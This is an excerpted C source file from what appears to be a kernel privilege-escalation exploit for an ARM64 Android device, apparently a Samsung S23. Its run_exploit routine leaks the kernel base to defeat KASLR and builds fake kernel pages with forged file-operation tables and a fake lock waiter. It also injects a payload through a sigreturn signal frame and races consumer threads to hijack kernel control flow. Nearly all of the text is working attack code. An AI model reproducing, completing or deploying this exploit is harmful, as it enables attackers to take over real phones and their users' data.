...
static atomic_int consumer_armed;
static atomic_int consumer_finished;
static atomic_int consumer_last_errno;
...
static volatile sig_atomic_t sigreturn_done;
static unsigned char g_sigreturn_payload[sizeof(((struct fpsimd_context *)0)->vregs)];
...
static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext)
{
    ...
    for (size_t off = 0; off + 8 <= 4096; ) {
        ...
        if (magic == FPSIMD_MAGIC &&
            ...
            sigreturn_target_addr = (uintptr_t)&fpsimd->vregs[0];
            ...
            if (sigreturn_mode == SIGRETURN_MODE_GHOST) {
                ...
                memcpy(dst, g_sigreturn_payload,
                       sizeof(g_sigreturn_payload));
            }
        ...
        if (size < 8 || (size & 0xf) || off + size > 4096) {
            break;
        }
        off += size;
    }
...
void do_sigreturn_fake_lock_route(void)
{
    ...
    if (sigreturn_mode == SIGRETURN_MODE_FULL) {
        ...
        memset(g_sigreturn_payload, 0, sizeof(g_sigreturn_payload));
        put_fake_waiter(g_sigreturn_payload, 0x18,
                        fake_fops, data_addr(ASHMEM_MISC_FOPS), 0,
                        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF, 0, 0,
    ...
    for (uint32_t i = 0; i < 100000000U &&
         !atomic_load(&consumer_armed); i++) {
        __asm__ volatile("yield" ::: "memory");
    }
    if (!atomic_load(&consumer_armed)) {
        cfi_last_step = 31;
        return;
    }
    ...
    sigreturn_done = 0;
    pid_t pid = getpid();
    int signal_tid = (int)syscall(SYS_gettid);
    if (signal_tid != tid ||
        syscall(SYS_tgkill, pid, signal_tid, SIGUSR1) != 0) {
        cfi_last_step = 32;
        return;
    }
    ...
    if (sigreturn_mode == SIGRETURN_MODE_FULL) {
        atomic_store(&punch_consume_go, 1);
        for (uint32_t i = 0; i < 1000000000U &&
             !atomic_load(&consumer_finished); i++) {
            __asm__ volatile("yield" ::: "memory");
        }
        ...
        pr_info("sigreturn full mode done calls=%d success=%d errno=%d\n",
                c, s, atomic_load(&consumer_last_errno));
...
static void wait_consumer_attempt_jitter(void) {
  static const uint64_t ticks[] = {0, 16, 32, 48, 64, 96, 128, 24};
  int attempt = 1;
  const char *value = getenv("S23_SUPERVISOR_ATTEMPT");
  if (value && *value) {
    attempt = atoi(value);
    if (attempt < 1) {
      attempt = 1;
  ...
  uint64_t limit = ticks[(unsigned)(attempt - 1) & 7U];
  uint64_t start;
  uint64_t now;
  ...
  while (!atomic_load(&punch_consume_stop)) {
    ...
    while (!atomic_load(&punch_consume_stop) &&
      ...
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        ...
        atomic_store(&consumer_last_errno, sched_ret == 0 ? 0 : sched_errno);
        if (sched_ret == 0) {
        ...
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&consumer_finished, 1);
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
...
void reset_main_route_state(void) {
  ...
  atomic_store(&consumer_armed, 0);
  atomic_store(&consumer_finished, 0);
  atomic_store(&consumer_last_errno, 0);
  atomic_store(&main_route_delay_usec, MAIN_ROUTE_DELAY_USEC);
...
int run_exploit(int argc, char **argv) {
  ...
  pr_info("stage=preparing-kernel-access\n");

  pin_to_core(CORE);
  pr_info("stage=locating-kernel\n");
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
  pr_info("stage=kernel-location-ready\n");
  ...
  if (!is_direct_ptr(pipebuf_page_base)) {
    pr_error("main route pipe preparation failed base=%016zx\n",
             pipebuf_page_base);
    return 1;
  }
#endif
  ...
  pin_to_core(CORE);
    ...
    !APP_FOPS_REUSE_VERIFIED_PAGE
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  pr_info("stage=kernel-page-ready base=%016zx pipe=%016zx\n",
          page_base, pipebuf_page_base);
#endif
...
#else
  if (!page_base || !fake_lock || !fake_fops) {
    pr_error("main route payload page preparation failed base=%016zx "
             "lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return 1;
  }
  pr_info("stage=entering-main-route base=%016zx lock=%016zx fops=%016zx\n",
          page_base, fake_lock, fake_fops);
  run_main_route_threads();
